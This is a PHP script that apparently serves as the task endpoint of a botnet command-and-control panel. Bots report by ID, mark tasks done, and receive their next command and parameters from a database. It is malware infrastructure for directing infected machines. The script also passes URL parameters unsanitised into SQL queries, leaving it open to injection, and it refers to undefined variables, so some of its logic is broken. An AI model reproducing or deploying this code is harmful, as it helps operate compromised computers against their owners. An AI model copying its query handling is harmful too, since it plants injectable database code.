<?php
	
	include 'config/db.php';
	
	try{	
		if (isset($_GET['uid']) && isset($_GET['t'])){ 
			
			$uid = $_GET['uid'];
			$task = $_GET['t'];
			//for a complete task
			//task.php?uid=0010B5C4996A&t=c;1
			if (strpos($task, 'c') !== false){
				list($part1, $task_done) = explode($split, $task);
				
				$task_done = $task_done + 1;
				$sql = "UPDATE bots SET task='$taskn' WHERE uid='$uid'";
				mysql_query($sql);
				$task = $task_done;
			}
			
			$sql = "SELECT * FROM `tasks` WHERE `task_id`='$task'";
			$query = mysql_query($sql);
			
			$current = mysql_num_rows ($query);
			
			if($task <= $current){
				
				while($row = mysql_fetch_array($query)) {
					if($row['task_id'] == $task){
						echo   $row['task'], $split, $row['tparam'], $split, $row['task_id'];
						
					}
				};
				
				}else{
				echo 'task.php_task.number.error';
			}
			
		}
		}catch(Exception $e){
		echo 'reg';
	}
	//echo '\0';
?>